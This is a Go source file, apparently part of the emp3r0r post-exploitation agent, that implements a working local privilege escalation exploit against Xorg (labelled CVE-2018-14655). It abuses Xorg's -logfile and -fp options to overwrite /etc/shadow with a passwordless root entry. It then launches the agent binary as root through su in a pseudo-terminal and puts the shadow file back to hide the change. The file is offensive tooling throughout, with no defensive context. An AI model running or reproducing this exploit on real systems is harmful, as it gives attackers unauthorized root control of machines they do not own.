package agent

import (
	"errors"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/creack/pty"
)

/*
	LPE exploits
*/

// GetRoot all-in-one
func GetRoot() (err error) {
	return GetRootXorg()
}

// GetRootXorg get root via xorg lpe CVE-2018-14655
func GetRootXorg() (err error) {
	var (
		out []byte
	)

	if os.Chdir("/etc") != nil {
		return errors.New("Cannot cd to /etc")
	}
	exp := exec.Command("Xorg", "-fp", "root::16431:0:99999:7:::", "-logfile", "shadow", ":1")
	go func() {
		out, err = exp.CombinedOutput()
		if err != nil &&
			!strings.Contains(err.Error(), "signal: killed") {
			log.Printf("start xorg: %s\n%v", out, err)
		}
	}()
	time.Sleep(5 * time.Second)
	err = exp.Process.Kill()
	if err != nil {
		return fmt.Errorf("failed to kill Xorg: %s\n%v", out, err)
	}

	log.Println("GetRootXorg shadow is successfully overwritten")

	err = os.Chdir(AgentRoot)
	if err != nil {
		return fmt.Errorf("failed to cd back to %s", AgentRoot)
	}

	su := exec.Command("su", "-c /tmp/emp3r0r")
	_, err = pty.Start(su)
	if err != nil {
		log.Println("Xorg start su in PTY: ", err)
		return
	}

	err = os.Rename("/etc/shadow.old", "/etc/shadow")
	if err != nil {
		log.Println("Restoring shadow: ", err)
		return
	}
	log.Println("GetRootXorg exited without error")

	return
}
